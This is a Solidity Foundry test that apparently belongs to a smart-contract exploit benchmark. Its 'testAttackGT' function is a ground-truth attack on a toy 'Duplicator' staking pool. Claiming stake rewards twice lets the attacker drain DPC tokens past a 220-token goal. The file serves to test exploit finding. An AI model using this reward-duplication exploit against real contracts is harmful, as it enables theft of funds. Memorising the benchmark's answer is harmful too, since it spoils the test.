// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "benchmarks/toy/Duplicator/Duplicator.sol";
import "benchmarks/toy/Duplicator/BNBToken.sol";
import "benchmarks/toy/Duplicator/DPCToken.sol";

contract DuplicatorTest is Test {
    address owner;
    address attacker;
    BNBToken bnbToken;
    DPCToken dpcToken;
    Duplicator duplicator;

    uint256 constant attackerInitBNB = 10 ether;
    uint256 constant attackerInitDPC = 0;
    uint256 constant poolInitBNB = 100 ether;
    uint256 constant poolInitDPC = 900 ether;

    uint256 constant requiredDPC = 220 ether;

    function setUp() public {
        owner = address(0xdeadbeef);
        attacker = address(this);

        vm.startPrank(owner);
        bnbToken = new BNBToken(1000 ether);
        dpcToken = new DPCToken(1000 ether);
        duplicator = new Duplicator(address(bnbToken), address(dpcToken));

        bnbToken.transfer(attacker, attackerInitBNB);
        dpcToken.transfer(attacker, attackerInitBNB);
        bnbToken.transfer(address(duplicator), poolInitBNB);
        dpcToken.transfer(address(duplicator), poolInitDPC);

        vm.stopPrank();
    }

    function testAttackGT() public {
        bnbToken.approve(address(duplicator), UINT256_MAX);
        duplicator.addLiquidity(attackerInitBNB);
        duplicator.claimStakeLp(1);
        duplicator.claimStakeLp(1);
        duplicator.withdrawReward(15 ether);
        require(attackGoal(), "Attack Failed!");
    }

    function attackGoal() public view returns (bool) {
        return dpcToken.balanceOf(attacker) >= requiredDPC;
    }
}
